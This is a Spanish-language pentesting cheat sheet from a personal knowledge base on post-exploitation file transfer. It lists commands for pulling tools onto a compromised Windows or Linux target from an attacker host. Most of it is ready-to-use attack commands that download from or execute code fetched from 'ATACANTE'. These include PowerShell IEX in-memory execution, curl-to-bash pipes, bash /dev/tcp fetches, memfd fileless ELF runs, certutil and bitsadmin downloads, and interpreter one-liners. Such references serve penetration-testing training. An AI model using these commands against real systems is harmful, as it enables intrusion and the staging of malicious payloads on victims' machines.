---
tipo: meta
aliases:
  - Transferencia - matriz
  - file transfer cheatsheet
tags:
  - meta/referencia
  - dominio/post-explotacion
---

# Transferencia de archivos - matriz de referencia

> [!info] Referencia pura, no un zettel
> Comandos para **traer** un archivo al objetivo (ingress). El criterio —qué canal según el entorno— vive en [[MOC - Transferencia de archivos]] y [[Traer herramientas al objetivo]]. Para sacar datos, [[Exfiltración - matriz de referencia]]; para hablar con un servicio FTP puntual, [[FTP - matriz de referencia]].

`ATACANTE` es tu IP; `OBJETIVO` la víctima; `ARCHIVO` el archivo a transferir.

## Servir el archivo desde el box del atacante
Cuando el objetivo no tiene internet pero te alcanza a vos.

| Servidor | Comando |
|---|---|
| HTTP (Python) | `python3 -m http.server 80` |
| HTTP (PHP) | `php -S 0.0.0.0:80` |
| HTTP (Ruby) | `ruby -run -e httpd . -p 80` |
| SMB (Impacket) | `impacket-smbserver share . -smb2support` |
| SMB con credenciales | `impacket-smbserver share . -smb2support -user u -password p` |
| FTP (Python) | `python3 -m pyftpdlib -p 21 -w` |

SMB con credenciales fuerza SMBv3 y evita el modo abierto.

## Windows — traer

| Método | Comando |
|---|---|
| `certutil` (clásica, muy vigilada) | `certutil -urlcache -split -f http://ATACANTE/ARCHIVO.exe C:\Windows\Temp\ARCHIVO.exe` |
| PowerShell IWR (a disco) | `powershell -c "Invoke-WebRequest http://ATACANTE/ARCHIVO.exe -OutFile C:\Temp\ARCHIVO.exe"` |
| PowerShell WebClient | `powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATACANTE/ARCHIVO.exe','C:\Temp\ARCHIVO.exe')"` |
| PowerShell en memoria (fileless) | `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATACANTE/script.ps1')"` |
| `bitsadmin` (segundo plano) | `bitsadmin /transfer job http://ATACANTE/ARCHIVO.exe C:\Temp\ARCHIVO.exe` |
| `curl.exe` (Win10 1803+) | `curl http://ATACANTE/ARCHIVO.exe -o C:\Temp\ARCHIVO.exe` |
| Copiar desde SMB del atacante | `copy \\ATACANTE\share\ARCHIVO.exe C:\Temp\ARCHIVO.exe` |
| Ejecutar desde SMB directo | `\\ATACANTE\share\ARCHIVO.exe` |
| `cscript` + `wget.vbs`/`wget.js` | `cscript //nologo wget.vbs http://ATACANTE/ARCHIVO.exe C:\Temp\ARCHIVO.exe` |
| PowerShell (WinRM, sin HTTP/SMB) | `$s = New-PSSession -ComputerName OBJETIVO; Copy-Item ARCHIVO -ToSession $s -Destination C:\Temp\` |
| Montar carpeta local por RDP | `xfreerdp /v:OBJETIVO /u:USER /p:PASS /drive:local,/ruta/local` |

`cscript` es solo el intérprete: `wget.vbs` no existe en Windows, hay que crearlo primero (sin el archivo el comando falla). Sirve para Windows viejo sin PowerShell ni `certutil`. Contenido de los scripts en [[Descarga por cscript - wget.vbs y wget.js]].
`Copy-Item` funciona en ambos sentidos (`-ToSession`/`-FromSession`). El montaje RDP también habilita copiar-pegar en la sesión; más en [[RDP - matriz de referencia]] y [[WinRM - matriz de referencia]].

## Linux — traer

| Método | Comando |
|---|---|
| `wget` | `wget http://ATACANTE/ARCHIVO -O /tmp/ARCHIVO` |
| `curl` | `curl http://ATACANTE/ARCHIVO -o /tmp/ARCHIVO` |
| bash puro por `/dev/tcp` (sin wget/curl) | `exec 3<>/dev/tcp/ATACANTE/80; printf 'GET /ARCHIVO\r\n' >&3; cat <&3 >/tmp/ARCHIVO` |
| `nc` — receptor en el objetivo | `nc -lvnp 4444 > /tmp/ARCHIVO` (atacante: `nc OBJETIVO 4444 < ARCHIVO`) |
| `scp` (si hay SSH) | `scp ARCHIVO user@OBJETIVO:/tmp/ARCHIVO` |
| **Fileless**: script en memoria (pipe a shell) | `curl -s http://ATACANTE/script.sh \| bash` (o `wget -qO- \| sh`) |
| **Fileless**: ELF por memfd | `fileless-elf-exec` — genera el one-liner que corre un ELF en RAM (`memfd_create`) |
| Semi-fileless: a RAM (tmpfs) | `curl http://ATACANTE/ARCHIVO -o /dev/shm/ARCHIVO && chmod +x /dev/shm/ARCHIVO && /dev/shm/ARCHIVO` |

- `nc`/`ncat`: cualquiera de los dos lados puede escuchar — escuchá vos si el firewall bloquea entrantes al objetivo (`nc ATACANTE 443 > ARCHIVO` en la víctima). Para que cierre solo al terminar: `-q 0` (nc clásico, lado emisor) o `--send-only`/`--recv-only` (Ncat).
- `/dev/tcp`: pedir sin versión hace que el server responda en HTTP/0.9 (solo el cuerpo, sin headers) — así se comporta `python3 -m http.server`, que es con lo que servís, y el archivo sale limpio (por eso la fila de arriba no lleva `sed`).
- Fileless pipe-a-shell: `| bash` ejecuta mientras baja; si el script es grande o la red lenta, bajalo entero antes con `bash -c "$(curl -fsSL http://ATACANTE/script.sh)"`.
- Contra un webserver real (nginx/apache) que responde HTTP/1.x, los headers caen dentro del archivo. Ahí usá esta variante, que pide en HTTP/1.0 y corta los headers con `sed`: `exec 3<>/dev/tcp/ATACANTE/80; printf 'GET /ARCHIVO HTTP/1.0\r\n\r\n' >&3; cat <&3 | sed '1,/^\r$/d' >/tmp/ARCHIVO` Con binarios verificá el hash igual — es el método más frágil.

### Con un intérprete instalado (sin wget/curl)
Cuando el objetivo no tiene cliente HTTP pero sí un runtime. Python es el que más sobrevive en un Linux endurecido; probar `python3` y caer a `python2.7`.

| Lenguaje | Comando |
|---|---|
| Python 3 | `python3 -c 'import urllib.request;urllib.request.urlretrieve("http://ATACANTE/ARCHIVO","/tmp/ARCHIVO")'` |
| Python 2.7 | `python2.7 -c 'import urllib;urllib.urlretrieve("http://ATACANTE/ARCHIVO","/tmp/ARCHIVO")'` |
| PHP (a disco) | `php -r '$f=file_get_contents("http://ATACANTE/ARCHIVO");file_put_contents("/tmp/ARCHIVO",$f);'` |
| PHP (pipe a shell, fileless) | `php -r 'echo file_get_contents("http://ATACANTE/script.sh");' \| bash` |
| Ruby | `ruby -e 'require "net/http";File.write("/tmp/ARCHIVO",Net::HTTP.get(URI.parse("http://ATACANTE/ARCHIVO")))'` |
| Perl | `perl -e 'use LWP::Simple;getstore("http://ATACANTE/ARCHIVO","/tmp/ARCHIVO");'` |


## Sin ninguna utilidad de red — base64 por copiar y pegar
Cuando solo hay una consola (shell restringida, sin salida de red).

| Paso | Comando |
|---|---|
| Codificar (atacante) | `base64 -w0 ARCHIVO` → copiar la cadena |
| Decodificar (objetivo Linux) | `echo 'BASE64' \| base64 -d > /tmp/ARCHIVO` |
| Decodificar (objetivo Windows) | `certutil -decode ARCHIVO.b64 ARCHIVO.exe` |


## Verificar que llegó entero
Comparar el hash a ambos lados antes de ejecutar.

| Sistema | SHA256 | MD5 |
|---|---|---|
| Linux | `sha256sum ARCHIVO` | `md5sum ARCHIVO` |
| Windows (PowerShell) | `Get-FileHash ARCHIVO.exe -Algorithm SHA256` | `Get-FileHash ARCHIVO.exe -Algorithm MD5` |
| Windows (sin PowerShell) | `certutil -hashfile ARCHIVO.exe SHA256` | `certutil -hashfile ARCHIVO.exe MD5` |


## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `certutil` descarga 0 bytes | caché previa | agregar `-urlcache -split -f` |
| binario "corrupto" al ejecutar | transferencia en modo texto (FTP) | forzar binario, o verificar hash |
| SMB no monta desde Win10/11 | SMBv1 deshabilitado | `-smb2support` en el server |
| PowerShell IWR muy lento | barra de progreso | `$ProgressPreference='SilentlyContinue'` |

